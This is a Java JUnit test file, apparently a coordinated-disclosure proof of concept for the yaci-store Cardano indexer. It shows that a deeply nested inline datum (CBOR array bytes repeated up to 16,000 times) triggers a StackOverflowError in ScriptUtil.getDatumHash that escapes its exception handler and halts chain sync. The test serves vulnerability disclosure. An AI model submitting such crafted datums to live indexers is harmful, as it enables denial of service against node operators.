package com.bloxbean.cardano.yaci.store.script.helper;

import org.junit.jupiter.api.Test;

import java.util.concurrent.atomic.AtomicReference;

/**
 * Demonstration for the maintainers (coordinated disclosure — please keep private).
 *
 * <p>This is the broader of the two paths: the script store's {@code OutputDatumProcessor}
 * (enabled by default, {@code store.script.enabled=true}) calls {@code ScriptUtil.getDatumHash}
 * for EVERY transaction output that carries an inline datum — no CIP-68 token or any particular
 * token is needed. {@code getDatumHash} runs {@code PlutusData.deserialize} (recursive cbor-java),
 * which throws {@link StackOverflowError} on a deeply nested datum. Its {@code catch (Exception)}
 * does not catch an {@link Error}, so during sync it propagates and stops the fetcher.
 *
 * <p>Runs on a 1 MB stack — the default thread stack on Linux x86_64.
 */
class CborNestingDemoTest {

    /** {@code depth} nested single-element CBOR arrays (0x81) wrapping a 0 — a minimal inline datum. */
    private static String nestedDatumHex(int depth) {
        return "81".repeat(depth) + "00";
    }

    @Test
    void demonstrateDeepNestingOverflow() throws InterruptedException {
        for (int depth : new int[]{1_000, 5_000, 16_000}) {
            String outcome = hashOn1MbStack(nestedDatumHex(depth));
            System.out.printf("ScriptUtil.getDatumHash, inline datum nested %6d deep -> %s%n", depth, outcome);
        }
    }

    private String hashOn1MbStack(String datumHex) throws InterruptedException {
        AtomicReference<String> outcome = new AtomicReference<>();
        Thread t = new Thread(null, () -> {
            try {
                outcome.set("returned hash " + ScriptUtil.getDatumHash(datumHex));
            } catch (Throwable e) {
                outcome.set("*** " + e.getClass().getName() + " — escapes catch(Exception), stops sync ***");
            }
        }, "demo", 1024 * 1024);
        t.start();
        t.join();
        return outcome.get();
    }
}
